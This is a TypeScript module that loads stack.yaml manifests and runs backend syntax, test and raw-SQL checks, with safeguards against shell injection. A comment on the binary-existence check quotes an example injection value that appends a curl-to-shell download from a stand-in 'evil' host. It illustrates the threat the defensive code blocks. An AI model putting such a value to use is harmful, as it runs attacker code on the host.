import { execFileSync, spawnSync } from "node:child_process";
import { existsSync, readFileSync } from "node:fs";
import { join } from "node:path";
import { parse as parseYaml } from "yaml";
import type { VerifyCheck } from "../../../types/index.js";
import { createCheck, runCommand } from "./check-utils.js";

type CommandCheck = {
  cmd: string;
  pass_signal?: string;
  skip_if_missing?: string;
};

export type StackManifest = {
  language: string;
  framework?: string;
  orm?: string;
  source?: string;
  verify?: {
    detect?: string;
    syntax?: CommandCheck;
    tests?: CommandCheck;
    raw_sql?: {
      patterns: string[];
      include_glob?: string;
      exclude_dirs?: string[];
    };
  };
};

export function loadStackManifest(
  workspace: string,
  skill: string,
): StackManifest | null {
  const path = join(
    workspace,
    ".agents",
    "skills",
    skill,
    "stack",
    "stack.yaml",
  );
  if (!existsSync(path)) return null;
  try {
    const parsed = parseYaml(readFileSync(path, "utf-8")) as unknown;
    if (
      parsed &&
      typeof parsed === "object" &&
      typeof (parsed as { language?: unknown }).language === "string"
    ) {
      return parsed as StackManifest;
    }
    return null;
  } catch {
    return null;
  }
}

// Wraps an arbitrary string so it survives as a single shell argument inside `sh -c`.
// Uses POSIX single-quote escaping, which is the only way to safely pass patterns
// containing `"`, `$`, backticks, or backslashes without interpretation.
function shellSingleQuote(value: string): string {
  return `'${value.replace(/'/g, "'\\''")}'`;
}

/**
 * Run a manifest `cmd` string safely without passing it through a shell.
 *
 * stack.yaml `verify.syntax.cmd` and `verify.tests.cmd` are plain strings like
 * `"bun run typecheck"` or `"npx tsc --noEmit"`. Passing them to execSync
 * routes them through `/bin/sh -c`, which interprets shell metacharacters —
 * a malicious manifest can therefore achieve RCE. Instead we split on
 * whitespace (honouring simple quoted tokens) and call spawnSync with an argv
 * array so the command is passed verbatim to the OS without shell interpretation.
 *
 * stdout and stderr are MERGED into the returned string. This preserves the
 * old `${cmd} 2>&1` behaviour the check logic relies on: toolchains like
 * `cargo`, `swift`, `python -m compileall`, and `bun test` emit their
 * diagnostics on stderr, so dropping stderr would make a real failure look
 * like empty output (a false "pass"). Returns `null` only when the binary
 * cannot be spawned at all (e.g. ENOENT); a non-zero exit still returns the
 * captured output so the caller can inspect it.
 *
 * Limitations: the splitter is intentionally minimal (no nested quotes, no
 * env-var expansion). Stack manifests are expected to contain simple commands;
 * shell pipelines / redirects are not supported by design (no shell runs).
 */
export function runManifestCmd(cmd: string, cwd: string): string | null {
  // Tokenise on whitespace — handles simple `"quoted arg"` and `'quoted arg'`
  // tokens by stripping the outer quotes but NOT expanding anything.
  const tokens: string[] = [];
  const tokenRe = /(?:"([^"]*)")|(?:'([^']*)')|(\S+)/g;
  let m = tokenRe.exec(cmd);
  while (m !== null) {
    tokens.push(m[1] ?? m[2] ?? m[3] ?? "");
    m = tokenRe.exec(cmd);
  }
  const [bin, ...args] = tokens;
  if (!bin) return null;
  const res = spawnSync(bin, args, {
    encoding: "utf-8",
    cwd,
    maxBuffer: 10 * 1024 * 1024,
  });
  // Could not spawn the binary at all (missing/permission) — signal "no output".
  if (res.error) return null;
  return `${res.stdout ?? ""}${res.stderr ?? ""}`.trim();
}

/**
 * Safe binary-existence check that avoids shell interpolation.
 *
 * `bin` originates from stack.yaml's `skip_if_missing` field (attacker-
 * controlled in a malicious project). Running `which ${bin}` through execSync
 * allows injection (e.g. `bun; curl evil|sh`). Instead we validate the token
 * against a strict identifier allowlist and then call `execFileSync("which",
 * [bin])` so no shell ever interprets the value.
 */
const SAFE_BIN_RE = /^[A-Za-z0-9._-]+$/;

export function hasBinary(bin: string, workspace: string): boolean {
  // Reject bin values that contain shell metacharacters or path separators.
  if (!SAFE_BIN_RE.test(bin)) return false;
  try {
    execFileSync("which", [bin], {
      cwd: workspace,
      stdio: ["pipe", "pipe", "pipe"],
    });
    return true;
  } catch {
    return false;
  }
}

export function checkBackendSyntax(
  manifest: StackManifest,
  workspace: string,
): VerifyCheck {
  const name = `${titleCase(manifest.language)} Syntax`;
  const cfg = manifest.verify?.syntax;
  if (!cfg) return createCheck(name, "skip", "No syntax check configured");
  if (cfg.skip_if_missing && !hasBinary(cfg.skip_if_missing, workspace)) {
    return createCheck(name, "skip", `${cfg.skip_if_missing} not available`);
  }
  // Use runManifestCmd (execFileSync-based) instead of runCommand (execSync
  // shell-based) so manifest-controlled cmd cannot inject shell commands.
  const output = runManifestCmd(cfg.cmd, workspace);
  if (output === null || output === "") {
    return createCheck(name, "pass", "Valid");
  }
  if (/error/i.test(output)) {
    return createCheck(name, "fail", "Syntax errors found");
  }
  return createCheck(name, "pass", "Valid");
}

export function checkBackendTests(
  manifest: StackManifest,
  workspace: string,
): VerifyCheck {
  const name = `${titleCase(manifest.language)} Tests`;
  const cfg = manifest.verify?.tests;
  if (!cfg) return createCheck(name, "skip", "No tests check configured");
  if (cfg.skip_if_missing && !hasBinary(cfg.skip_if_missing, workspace)) {
    return createCheck(name, "skip", `${cfg.skip_if_missing} not available`);
  }
  // Use runManifestCmd (execFileSync-based) instead of runCommand (execSync
  // shell-based) so manifest-controlled cmd cannot inject shell commands.
  const output = runManifestCmd(cfg.cmd, workspace);
  if (output === null) {
    return createCheck(name, "fail", "Tests failing");
  }
  const signal = cfg.pass_signal;
  if (signal && output.includes(signal)) {
    return createCheck(name, "pass", "Tests pass");
  }
  if (!signal && (output.includes("passed") || output.includes("ok"))) {
    return createCheck(name, "pass", "Tests pass");
  }
  if (output.includes("no tests ran") || output.includes("0 tests")) {
    return createCheck(name, "pass", "No tests to run");
  }
  return createCheck(name, "fail", "Tests failing");
}

export function checkBackendRawSql(
  manifest: StackManifest,
  workspace: string,
): VerifyCheck {
  const name = "SQL Injection";
  const cfg = manifest.verify?.raw_sql;
  if (!cfg || cfg.patterns.length === 0) {
    return createCheck(name, "skip", "No raw_sql check configured");
  }
  const includeFlag = cfg.include_glob
    ? `--include=${shellSingleQuote(cfg.include_glob)}`
    : "";
  const excludes = (cfg.exclude_dirs ?? [])
    .map((dir) => `| grep -v ${shellSingleQuote(dir)}`)
    .join(" ");
  const patternArg = shellSingleQuote(cfg.patterns.join("|"));
  const cmd = `grep -rn ${includeFlag} -E ${patternArg} . 2>/dev/null ${excludes} | head -1`;
  const result = runCommand(cmd, workspace);
  if (result) {
    const file = result.split(":")[0] ?? "unknown";
    return createCheck(name, "fail", `Raw SQL pattern in ${file}`);
  }
  return createCheck(name, "pass", "None detected");
}

function titleCase(value: string): string {
  if (value.length === 0) return value;
  return value.charAt(0).toUpperCase() + value.slice(1);
}
